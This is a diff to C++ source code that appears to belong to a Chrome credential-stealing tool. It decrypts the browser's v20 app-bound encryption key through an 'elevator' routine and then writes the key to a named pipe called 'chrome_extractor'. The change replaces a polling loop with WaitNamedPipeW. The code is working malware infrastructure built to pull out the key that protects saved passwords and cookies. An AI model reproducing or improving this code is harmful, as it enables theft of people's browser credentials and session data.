@@ -3,7 +3,6 @@
 #include <vector>
 #include <filesystem>
 #include <fstream>
-#include <iostream>
 #include <thread>
 #include <algorithm>
 #include <wincrypt.h>
@@ -166,11 +165,14 @@ void do_work() {
                 auto v20_key = decrypt_with_elevator(blob, browser);
 
                 if (!v20_key.empty()) {
+                    const wchar_t* pipe_name = L"\\\\.\\pipe\\chrome_extractor";
                     HANDLE h_pipe = INVALID_HANDLE_VALUE;
-                    for (int i = 0; i < 60; i++) {
-                        h_pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
-                        if (h_pipe != INVALID_HANDLE_VALUE) break;
-                        Sleep(500);
+
+                    for (int i = 0; i < 10; i++) {
+                        if (WaitNamedPipeW(pipe_name, 2000)) {
+                            h_pipe = CreateFileW(pipe_name, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
+                            if (h_pipe != INVALID_HANDLE_VALUE) break;
+                        }
                     }
 
                     if (h_pipe != INVALID_HANDLE_VALUE) {
